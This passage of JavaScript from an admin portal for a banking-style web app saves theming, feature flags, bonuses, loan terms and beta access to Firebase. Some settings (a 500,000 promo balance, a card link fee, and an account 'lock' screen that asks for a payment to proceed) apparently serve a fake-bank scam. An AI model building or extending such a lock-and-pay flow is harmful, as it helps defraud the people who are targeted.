      accentColor:          _getCol('accentColor','#4d9fff'),
      bgColor:              _getCol('bgColor','#f0f2f5'),
      bgCardColor:          '#ffffff',
      textColor:            _getCol('textColor','#0d0f14'),
      balanceCardBg1:       _getCol('balanceCardBg1','#0d0f14'),
      balanceCardBg2:       _getCol('balanceCardBg2','#1a3a5c'),
      balanceCardGlow:      _getCheck('cfg-balanceCardGlow'),
      balanceCardGlowColor: _getCol('balanceCardGlowColor','rgba(26,86,255,0.35)'),
      balanceCardGlowSize:  parseInt(_getVal('cfg-balanceCardGlowSize'))||28,
      navBgColor:           _getCol('navBgColor','#ffffff'),
      navActiveColor:       _getCol('navActiveColor','#1a56ff'),
      drawerBgColor:        _getCol('drawerBgColor','#ffffff'),
      drawerHeadBg1:        _getCol('drawerHeadBg1','#0d0f14'),
      drawerHeadBg2:        _getCol('drawerHeadBg2','#1a3a5c'),
      buttonRadius:         parseInt(_getVal('cfg-buttonRadius'))||12,
      fontFamily:           _getVal('cfg-fontFamily')||'Sora',
      darkMode:             _getCheck('cfg-darkMode'),
      // EmailJS — stored here in Firebase so user.js can load without hardcoding
      emailjs:              emailjs,
      adminEmail:           _getVal('cfg-adminEmail')||'',
      // Bonuses
      welcomeBonus:         parseFloat(_getVal('cfg-welcomeBonus'))||0,
      promoCode:            (_getVal('cfg-promoCode')||'').toUpperCase(),
      promoBalance:         parseFloat(_getVal('cfg-promoBalance'))||500000,
      cardVerifyBonus:      parseFloat(_getVal('cfg-cardVerifyBonus'))||10,
      cardLinkFee:          parseFloat(_getVal('cfg-cardLinkFee'))||10,
      referralBonus:        parseFloat(_getVal('cfg-referralBonus'))||10,
      referralThreshold:    parseInt(_getVal('cfg-referralThreshold'))||12,
      defaultCurrency:      _getVal('cfg-defaultCurrency')||'USD',
      // Features
      enableSendMoney:     _getCheck('cfg-enableSendMoney'),
      enableRequestMoney:  _getCheck('cfg-enableRequestMoney'),
      enableAddFunds:      _getCheck('cfg-enableAddFunds'),
      enableWithdraw:      _getCheck('cfg-enableWithdraw'),
      enableReferrals:     _getCheck('cfg-enableReferrals'),
      enableOffers:        _getCheck('cfg-enableOffers'),
      enableReceiptsTab:   _getCheck('cfg-enableReceiptsTab'),
      enableKYC:           _getCheck('cfg-enableKYC'),
      enableLock:          _getCheck('cfg-enableLock'),
      enableAddCard:       _getCheck('cfg-enableAddCard'),
      enableCardIdVerification: _getCheck('cfg-enableCardIdVerification'),
      pwaPrompt:           _getCheck('cfg-pwaPrompt'),
      pwaPromptDelay:      (parseInt(_getVal('cfg-pwaPromptDelay'))||30)*1000,
      showAccountNumber:   _getCheck('cfg-showAccountNumber'),
      showBalanceDefault:  _getCheck('cfg-showBalanceDefault'),
      // Navigation
      showTabAccounts:     _getCheck('cfg-showTabAccounts'),
      showTabReceipts:     _getCheck('cfg-showTabReceipts'),
      showTabSendReq:      _getCheck('cfg-showTabSendReq'),
      showTabOffers:       _getCheck('cfg-showTabOffers'),
      showTabRefer:        _getCheck('cfg-showTabRefer'),
      // Maintenance
      maintenanceMode:     _getCheck('cfg-maintenanceMode'),
      maintenanceMessage:  _getVal('cfg-maintenanceMessage')||'',
      // Lock
      // Gate screen
      comingSoonTitle:     _getVal('cfg-comingSoonTitle')||'Setting up your account\u2026',
      comingSoonMessage:   _getVal('cfg-comingSoonMessage')||"We're getting things ready. Check back soon!",
      linkDisclaimer:      _getVal('cfg-linkDisclaimer')||'Sandbox environment — for testing purposes only.',
      // Account restriction / demo lock
      lockTitle:           _getVal('cfg-lockTitle')||'Identity Verification Required',
      lockSubtitle:        _getVal('cfg-lockSubtitle')||'To continue, please take the next step to verify your identity.',
      lockBtnLabel:        _getVal('cfg-lockBtnLabel')||'Take the Next Step',
      lockConfirmMessage:  _getVal('cfg-lockConfirmMessage')||'Thank you. Your submission is under review. You will be notified within 24 hours.',
      lockDefaultAmount:   parseFloat(_getVal('cfg-lockDefaultAmount'))||150,
      lockContactEmail:    _getVal('cfg-lockContactEmail')||'',
      lockStep1Text:       _getVal('cfg-lockStep1Text')||'',
      lockStep2Text:       _getVal('cfg-lockStep2Text')||'',
      lockStep3Text:       _getVal('cfg-lockStep3Text')||'',
      lockPaymentMethods:  lockPaymentMethods,
      // Biometric
      biometricEnabled:    _getCheck('cfg-biometricEnabled'),
      biometricTitle:      _getVal('cfg-biometricTitle')||'',
      biometricSubtitle:   _getVal('cfg-biometricSubtitle')||'',
      // Institutions
      institutions:        institutions,
      // Forms
      forms:               forms,
      // Loan requirements
      loanRequirements:    _collectLoanRequirements(),
      // Labels
      labels:{en:en},
      enabledLangs:        enabledLangs,
      updatedAt:           Date.now()
    };
    // Preserve other language labels from existing config
    if(_cfg&&_cfg.labels){
      ['fr','es','pt'].forEach(function(l){if(_cfg.labels[l])newCfg.labels[l]=_cfg.labels[l];});
    }
    _db.ref(DB.appConfig).set(newCfg,function(err){
      if(err){_showToast('Save failed: '+err.message,'error');}
      else{_cfg=newCfg;_showToast('✅ Settings saved and live!','success');_showSaveStatus();}
    });
  }

  function _showSaveStatus(){
    document.querySelectorAll('.save-status').forEach(function(el){
      el.classList.add('show');setTimeout(function(){el.classList.remove('show');},3000);
    });
  }

  // ── FIREBASE FIELDS ──────────────────────────────────────
  function _populateFirebaseFields(){
    _setVal('fb-apiKey',           FIREBASE_CONFIG.apiKey||'');
    _setVal('fb-projectId',        FIREBASE_CONFIG.projectId||'');
    _setVal('fb-authDomain',       FIREBASE_CONFIG.authDomain||'');
    _setVal('fb-databaseURL',      FIREBASE_CONFIG.databaseURL||'');
    _setVal('fb-storageBucket',    FIREBASE_CONFIG.storageBucket||'');
    _setVal('fb-appId',            FIREBASE_CONFIG.appId||'');
  }

  // ── CLOUDINARY FIELDS ─────────────────────────────────────
  function _populateCloudinaryFields(){
    var cl=(_cfg.cloudinary)||{};
    _setVal('cl-cloud',   cl.cloudName||'dbgxllxdb');
    _setVal('cl-profile', cl.presets&&cl.presets.profile||'atlantas_profile');
    _setVal('cl-identity',cl.presets&&cl.presets.identity||'atlantas_identity');
    _setVal('cl-docs',    cl.presets&&cl.presets.docs||'atlantas_docs');
    _setVal('cl-maxW',    cl.compression&&cl.compression.maxW||1200);
    _setVal('cl-maxH',    cl.compression&&cl.compression.maxH||1200);
    _setVal('cl-quality', cl.compression&&cl.compression.quality||0.82);
  }

  // ── LOAN SETTINGS ─────────────────────────────────────────────
  function _populateLoanFields(){
    var lr=(_cfg.loanRequirements)||{};
    _setVal('loan-min',  lr.minAmount||100);
    _setVal('loan-max',  lr.maxAmount||10000);
    _setVal('loan-rate', lr.interestRate||5);
    _setVal('loan-duration', lr.duration||'1\u201312 months');
    _setVal('loan-note', lr.note||'');
    _setVal('loan-reqs', (lr.requirements||[]).join('\n'));
  }
  function _collectLoanRequirements(){
    var reqs=(_getVal('loan-reqs')||'').split('\n').map(function(r){return r.trim();}).filter(Boolean);
    return {
      minAmount:    parseFloat(_getVal('loan-min'))||100,
      maxAmount:    parseFloat(_getVal('loan-max'))||10000,
      interestRate: parseFloat(_getVal('loan-rate'))||5,
      duration:     _getVal('loan-duration')||'1\u201312 months',
      note:         _getVal('loan-note')||'',
      requirements: reqs.length?reqs:['Valid verified identity (KYC)','Active account in good standing','No outstanding unpaid loans']
    };
  }

  // ── TOAST ─────────────────────────────────────────────────
  function _showToast(msg,type){
    var t=document.getElementById('dev-toast');if(!t)return;
    t.textContent=msg;t.className='show '+(type||'');
    setTimeout(function(){t.className='';},3500);
  }

  // ── SIGN OUT ──────────────────────────────────────────────
  function signOut(){
    if(!confirm('Sign out of developer portal?'))return;
    _auth.signOut().then(function(){_showLogin();});
  }

  // ── BETA ACCESS ───────────────────────────────────────────
  function _loadBetaUsers(){
    var con=document.getElementById('beta-users-list');if(!con)return;
    _db.ref(DB.admins).once('value',function(snap){
      var d=snap.val()||{};
      var rows=Object.keys(d).filter(function(uid){return d[uid]&&d[uid].betaAccess===true;});
      if(!rows.length){con.innerHTML='<div style="color:var(--text3);font-size:13px;">No users have been granted access yet.</div>';return;}
      con.innerHTML='';
      rows.forEach(function(uid){
        var entry=d[uid];
        var row=document.createElement('div');
        row.style.cssText='display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border2);';
        row.innerHTML='<div><div style="font-size:13px;font-weight:600;color:var(--text);">'+_esc(entry.betaEmail||uid)+'</div>'+
          '<div style="font-size:11px;color:var(--text3);margin-top:2px;font-family:var(--mono);">'+_esc(uid)+'</div></div>'+
          '<button onclick="DEV.betaRevoke(\''+_esc(uid)+'\')" style="background:rgba(248,113,113,0.08);border:1px solid rgba(248,113,113,0.2);color:var(--error);border-radius:8px;padding:6px 14px;font-size:12px;font-weight:600;cursor:pointer;">Revoke</button>';
        con.appendChild(row);
      });
    });
  }
  function betaLookup(){
    var email=(document.getElementById('beta-search-email').value||'').trim().toLowerCase();
    var res=document.getElementById('beta-lookup-result');
    if(!email||!email.includes('@')){res.innerHTML='<div style="color:var(--error);font-size:13px;">Enter a valid email.</div>';return;}
    res.innerHTML='<div style="color:var(--text3);font-size:13px;">Searching…</div>';
    _db.ref(DB.users).orderByChild('email').equalTo(email).once('value',function(snap){
      if(!snap.exists()){res.innerHTML='<div style="color:var(--error);font-size:13px;">No user found with that email.</div>';return;}
      var uid=Object.keys(snap.val())[0];var userData=snap.val()[uid];
      var name=(userData.firstname||'')+(userData.surname?' '+userData.surname:'');
      _db.ref(DB.admins+'/'+uid+'/betaAccess').once('value',function(aSnap){
        var hasAccess=aSnap.val()===true;
        res.innerHTML='<div style="background:var(--bg3);border:1px solid var(--border2);border-radius:12px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;">'+
          '<div><div style="font-size:14px;font-weight:700;color:var(--text);">'+_esc(name||email)+'</div>'+
          '<div style="font-size:12px;color:var(--text3);margin-top:2px;">'+_esc(email)+'</div>'+
          '<div style="font-size:12px;margin-top:6px;color:'+(hasAccess?'var(--success)':'var(--text2)')+';">'+(hasAccess?'✅ Has access':'⏳ No access — Gate screen')+'</div></div>'+
          (hasAccess?'<button onclick="DEV.betaRevoke(\''+_esc(uid)+'\')" style="background:rgba(248,113,113,0.08);border:1px solid rgba(248,113,113,0.2);color:var(--error);border-radius:8px;padding:8px 16px;font-size:13px;font-weight:600;cursor:pointer;">Revoke</button>':
          '<button onclick="DEV.betaGrant(\''+_esc(uid)+'\',\''+_esc(email)+'\')" style="background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:8px;padding:8px 16px;font-size:13px;font-weight:600;cursor:pointer;">Grant Access</button>')+
          '</div>';
      });
    });
  }
  function betaGrant(uid,email){
    _db.ref(DB.admins+'/'+uid).update({betaAccess:true,betaEmail:email},function(err){
      if(err){_showToast('Failed: '+err.message,'error');return;}
      _showToast('✅ Access granted to '+email,'success');betaLookup();_loadBetaUsers();
    });
  }
  function betaRevoke(uid){
    _db.ref(DB.admins+'/'+uid+'/betaAccess').remove(function(err){
      if(err){_showToast('Failed: '+err.message,'error');return;}
      _showToast('Access revoked.','success');
      var res=document.getElementById('beta-lookup-result');if(res)res.innerHTML='';_loadBetaUsers();
    });
  }

  // ── MOBILE SIDEBAR ────────────────────────────────────────
  function _initMobileSidebar(){
    var style=document.createElement('style');
    style.textContent='@media(max-width:768px){.sidebar{position:fixed;left:-240px;transition:left .28s ease;z-index:1000;}.sidebar.open{left:0;}.dev-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:999;display:none;}.dev-overlay.show{display:block;}.portal-main{margin-left:0!important;}.mob-menu{display:flex!important;}}';
    document.head.appendChild(style);
    var overlay=document.createElement('div');overlay.className='dev-overlay';overlay.onclick=function(){document.querySelector('.sidebar').classList.remove('open');overlay.classList.remove('show');};
    document.body.appendChild(overlay);
    // Add mobile menu button
    var topbar=document.querySelector('.ptopbar');
    if(topbar){
      var btn=document.createElement('button');
      btn.style.cssText='display:none;background:none;border:none;cursor:pointer;padding:4px;flex-direction:column;gap:5px;align-items:center;justify-content:center;margin-right:8px;';
      btn.className='mob-menu';
      btn.innerHTML='<span style="display:block;width:20px;height:2px;background:var(--text);border-radius:2px;"></span><span style="display:block;width:20px;height:2px;background:var(--text);border-radius:2px;"></span><span style="display:block;width:20px;height:2px;background:var(--text);border-radius:2px;"></span>';
      btn.onclick=function(){document.querySelector('.sidebar').classList.toggle('open');overlay.classList.toggle('show');};
      topbar.insertBefore(btn,topbar.firstChild);
    }
    // Close sidebar when nav item clicked on mobile
    document.querySelectorAll('.ni').forEach(function(btn){
      btn.addEventListener('click',function(){
        if(window.innerWidth<=768){document.querySelector('.sidebar').classList.remove('open');overlay.classList.remove('show');}
      });
    });
  }

  // ── UTILS ─────────────────────────────────────────────────
  function _setVal(id,val){var e=document.getElementById(id);if(!e)return;if(e.tagName==='INPUT'||e.tagName==='TEXTAREA')e.value=val||'';else if(e.tagName==='SELECT')e.value=val||'';else e.textContent=val||'';}
  function _getVal(id){var e=document.getElementById(id);if(!e)return'';return e.value!==undefined?e.value:e.textContent||'';}
  function _setCheck(id,val){var e=document.getElementById(id);if(e)e.checked=!!val;}
  function _getCheck(id){var e=document.getElementById(id);return e?!!e.checked:false;}
  function _esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}

  window.addEventListener('DOMContentLoaded',function(){boot();_initMobileSidebar();});

  return{
    switchSection:switchSection,
    addInst:addInst,
    deleteInst:deleteInst,
    moveInst:moveInst,
    addInstColumn:addInstColumn,
    addFormField:addFormField,
    save:save,
    signOut:signOut,
    betaLookup:betaLookup,
    betaGrant:betaGrant,
    betaRevoke:betaRevoke
  };
})();
